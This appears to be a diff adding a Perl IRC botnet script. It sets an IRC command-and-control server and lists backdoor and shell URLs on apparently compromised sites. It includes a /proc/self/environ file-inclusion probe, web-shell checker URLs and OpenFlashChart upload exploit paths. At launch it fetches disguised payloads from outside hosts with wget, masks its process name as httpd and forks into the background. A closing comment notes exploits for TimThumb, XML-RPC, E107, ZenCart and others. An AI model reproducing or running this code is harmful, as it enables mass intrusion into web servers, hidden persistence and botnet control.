@@ -1,0 +1,152 @@
+#!/usr/bin/perl
+
+use HTTP::Request;
+use HTTP::Request::Common;
+use HTTP::Request::Common qw(POST);
+use LWP::Simple;
+use LWP 5.64;
+use LWP::UserAgent;
+use Socket;
+use IO::Socket;
+use IO::Socket::INET;
+use IO::Select;
+use MIME::Base64;
+use URI::Escape;
+use Digest::MD5 qw(md5_hex);
+
+my $datetime    = localtime;
+my $fakeproc  	= "/usr/sbin/httpd";
+my $ircserver   = "mbeleng.grasak.tk";
+my $ircport   	= "6667";
+my $number = int(rand(100));
+my $nickname  	= "X[".$number."]X";
+my $ident     	= "kediri";
+my $channel   	= "#ambu";
+my $chanxxx	= "#ambu";
+my $admin    	= "Ambu";
+my $admin1    	= "Ambu";
+my $admin2    	= "Ambu";
+
+my $fullname    = "BLACKHAT";
+my $rawmsg      = $ARGV[4];
+my $msgraw      = $ARGV[5];
+
+my $nob0dy	= "9,1[4!9]15[scanner] x ";
+my $thumblogo	= "9,1[4!9]15TiM 4<9X4> ";
+my $xmllogo	= "9,1[4!9]15Xml 4<9X4> ";
+my $e107logo	= "9,1[4!9]E107 4<9X4> ";
+my $zenlogo	= "9,1[4!9]15ZenCart 4<9X4> ";
+my $jcelogo	= "9,1[4!9]15JcE 4<9X4> ";
+my $rcilogo	= "9,1[4!9]15Rci 4<9X4> ";
+my $oscologo	= "11[9OScO11]8 +-+ ";
+my $carilogo    = "Find";
+my $thumbcmd	= "!tim";
+my $xmlcmd	= "!xmlx";
+my $e107cmd	= "!e".$number."";
+my $zencmd	= "!zenx";
+my $jcecmd	= "!jc".$number."";
+my $rcicmd	= "!rc".$number."";
+my $oscocmd	= "!osco".$number."";
+my $cmdlfi	= "!cmdlfi";
+my $cmdxml	= "!cmdxml";
+my $cmde107	= "!cmde107";
+my $ftpcmd	= "!ftp";
+my $botxx	= "http://www.e-library.jabarprov.go.id/assets/js/bot.log";
+my $timot	= 10;
+my $silentmode	= 1;
+my $hostinjector = "picasa.com.profinteractive.com";
+my $thumbid = "http://".$hostinjector."/pagat.php";
+my $botdid = "http://wordpress.com.colegiobetania.cl/.bashrc/magic1.php";
+my $botxdid = "http://wordpress.com.colegiobetania.cl/.bashrc/magic2.php";
+my $thumbshell = uri_escape($thumbid);
+my $md5php = md5_hex($thumbid).".php";
+my $md5bot = md5_hex($botdid).".php";
+my $md5botx = md5_hex($botxdid).".php";
+my $botid = uri_escape($botdid);
+my $botxid = uri_escape($botxdid);
+my $injector  = "www.e-library.jabarprov.go.id/assets/js/end.jpg";
+my $backdoor  = "www.e-library.jabarprov.go.id/assets/js/moi.jpg";
+my $backdoor2  = "www.e-library.jabarprov.go.id/assets/js/moi.jpg";
+my $botshell  = "www.e-library.jabarprov.go.id/assets/js/foto81.jpg";
+my $botshell2  = "www.e-library.jabarprov.go.id/assets/js/foto82.jpg";
+my $botshell3  = "www.e-library.jabarprov.go.id/assets/js/foto83.jpg";
+
+my $uagent    = "Microsoft Internet Explorer/4.0b1 (Windows 95)","Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)","Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)","Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)","Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)","Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)","Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)","Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)","Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)","Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)","Mozilla/4.0 (compatible; MSIE 7.0b; Win32)","Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)","Microsoft Pocket Internet Explorer/0.6","Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)","MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;","Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)","Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)","Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)","Advanced Browser (http://www.avantbrowser.com)","Avant Browser (http://www.avantbrowser.com)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)","Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)","Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)","Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511","Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929","Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0","Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox","Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6","Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7","Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4","Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4","Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1","Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1","Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1","Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2","Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b","Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0","Mozilla/3.0 (OS/2; U)","Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)","Mozilla/4.61 (Macintosh; I; PPC)","Mozilla/4.61 [en] (OS/2; U)","Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)","Mozilla/4.8 [en] (Windows NT 5.0; U)";
+
+my $lfdtest   = "../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000";
+my $jpath	= "?____pgfa=http%253A%252F%252Fwww.google.com%252Fsearch?q=";
+my $chk1 = "http://www.concours.gov.bf/.mozilla/plugins/search.php".$jpath;
+my $chk2 = "http://www.pkstorages.com//plugins/content/seka.php".$jpath;
+my $chk3 = "http://www.voladm.gov.ua/ru/filesarchive/buttons/ENG/search.php".$jpath;
+my $chk4 = "http://sihsasuministros.com//plugins/content/seka.php".$jpath;
+my $chk5 = "http://kavkazinterpress.ru/plugins/content/config.inc.php".$jpath;
+my $chk6 = "http://www.edatel.com.co/images/documentos/requisitos/search.php".$jpath;
+my $chk7 = "http://discoverdavinci.com//wp-content/themes/u-design/scripts/cufon/Bebas/page_not_found.php".$jpath;
+my $chk8 = "http://smk-anwarussholichin.com/plugins/lightbox/images/search.php".$jpath;
+my $chk9 = "http://www.concours.gov.bf/.mozilla/plugins/search.php".$jpath;
+my $chk10 = "http://www.qepta.se/includes/js/calendar/lang/search.php".$jpath;
+my $chk11 = "http://discoverdavinci.com//wp-content/themes/u-design/scripts/cufon/Bebas/page_not_found.php".$jpath;
+my $chk12 = "http://www.terrys-centrum.nl/images/stories/class-mail.php".$jpath;
+my $chk13 = "http://trimuliabatam.com/css/kb.php.phpgif".$jpath;
+my $chk14 = "http://www.infostoritve.si//plugins/content/seka.php".$jpath;
+my $chk15 = "http://www.paynsurf.co.uk/includes/js/calendar/lang/search.php".$jpath;
+my $chk16 = "http://sihsasuministros.com//plugins/content/seka.php".$jpath;
+my $chk17 = "http://www.premiumbathrooms.ca/includes/languages/english/modules/payment/search.php".$jpath;
+my $chk18 = "http://www.motorcyclesuperstore.com.au/libraries/openid/Auth/OpenID/search.php".$jpath;
+my $chk19 = "www.atcare.gr/logs/search.php".$jpath;
+my $chk20 = "http://decormaster.org/joomla/components/com_weblinks/views/category/tmpl/search.php".$jpath;
+my $chk21 = "http://latihan.putraalinson.co.id//templates/poeji/js/search.php".$jpath;
+my $chk22 = "http://www.krek.hu/plugins/content/config.index.php".$jpath;
+my $chk23 = "http://viewwebinars.com/wp-includes/errors.php".$jpath;
+my $chk24 = "http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php".$jpath;
+my $chk25 = "http://www.vics.fr/images/.logs/search.php".$jpath;
+my $chk26 = "http://www.an-tc.ru/images/stories/errors.php".$jpath;
+my $chk27 = "http://villadedesa.com/components/com_media/helpers/search.php".$jpath;
+my $chk28 = "http://www.effeci.lc.it/plugins/class-mail.php".$jpath;
+my $chk29 = "http://elplazza.ro//assets/symbols/set2/%5BOriginals%5D/search.php".$jpath;
+my $chk30 = "http://tampons.jeanneret.fr/templates/generic2/includes/languages/french/search.php".$jpath;
+my $chk31 = "http://www.planville.com.br/plugins/search/config.index.php".$jpath;
+my $chk32 = "http://dom-sad-ogorod.ru/plugins/search/config.inc.php".$jpath;
+my $chk33 = "http://kavkazinterpress.ru/plugins/content/config.inc.php".$jpath;
+my $chk34 = "http://www.yplittleport.org.uk/media/system/config.index.php".$jpath;
+my $chk35 = "http://www.quintadohespanhol.pt/templates/system/html/search.php".$jpath;
+my $chk36 = "http://www.mateinavodari.ro/includes/js/calendar/lang/search.php".$jpath;
+my $chk37 = "http://www.vipesrl.it/gruppo/config.inc.php".$jpath;
+my $chk38 = "http://www.planetaimportacion.com.ar/imagenes/search.php".$jpath;
+my $chk39 = "http://mall.arc-flash.com.tw/images/default/search.php".$jpath;
+my $chk40 = "http://www.zxcost.cn/cache/kb.php".$jpath;
+
+my $engine	= "chkUY,chkBY,chkSU,chkMD,chkCOOP,chkCAT,chkASIA,chkMOBI,chkNAME,chkFI,chkLV,chkTRAVEL,chkBO,chkPE,chkPE,chkPT,chkTV,chkCC,chkCO,chkEDU,chkEC,chkUZ,chkZA,chkKZ,chkAC,chkAD,chkAE,chkAF,chkAG,chkAL,chkAM,chkAN,chkAT,chkAR,chkAU,chkBE,chkHU,chkOrG,chkCoM,chkNeT,chkPL,chkIT,chkID,chkMY,chkES,chkUK,chkUS,chkJP,chkKR,chkDE,chkDK,chkCA,chkBR,chkRO,chkRU,chkNL,chkInfO,chkFR,chkIN,chkMX,chkCZ,chkCL,chkUA,chkCN,chkIR,chkTH,chkEU,chkPH,chkIL,chkIM,chkSI,chkBIZ,GooGLe,WaLLa,YaHoo,AsK,Bing,OnEt,CLusTy,SaPo,AoL,UoL,LyCos,HotBot,BigLobe,SeZNam";
+
+my @jpaths	= ('/openemr/library/openflashchart',
+				'/administrator/components/com_redmystic/chart',
+				'/wp-content/plugins/wp-slimstat-ex/lib/ofc',
+				'/administrator/components/com_jinc/classes/graphics',
+				'/administrator/components/com_maianmedia/utilities/charts',
+				'/administrator/components/com_jnews/includes/openflashchart','/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart','/wp-content/plugins/woopra/inc','/administrator/components/com_maian15/charts','/administrator/components/com_jnewsletter/includes','/admin_area/charts','wp-content/plugins/seo-watcher/ofc','/administrator/components/com_joomleague/assets/classes');
+
+my $jvuln	= "/php-ofc-library/ofc_upload_image.php";
+my $jshell	= "/tmp-upload-images/kediri.php.phpgif";
+
+$SIG{'INT'}   = 'IGNORE';
+$SIG{'HUP'}   = 'IGNORE';
+$SIG{'TERM'}  = 'IGNORE';
+$SIG{'CHLD'}  = 'IGNORE';
+$SIG{'PS'}    = 'IGNORE';
+
+chdir("/tmp");
+chop (my $priper = `wget www.aecconsultandconnect.co.th/images/smile.gif -O anon.gif;wget http://www.e-library.jabarprov.go.id/assets/js/tongue.jpg -O newbie.gif;wget http://www.e-library.jabarprov.go.id/assets/js/sadow.jpg -O banners.gif;wget www.e-library.jabarprov.go.id/assets/js/hello.jpg -O images.gif`);
+
+$ircserver = "$ARGV[0]" if $ARGV[0];
+$ircport = "$ARGV[1]" if $ARGV[1];
+$nickname = "$ARGV[2]" if $ARGV[2];
+$channel = '#'."$ARGV[3]" if $ARGV[3];
+
+$0 = "$fakeproc"."\0" x 16;
+my $pid = fork;
+exit if $pid;
+die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);
+
+# Note: This script contains additional IRC bot functionality for C2 communication
+# and multi-platform vulnerability scanning including TimThumb, XML-RPC, E107,
+# ZenCart, JCE, RCI, and OSCommerce exploits.
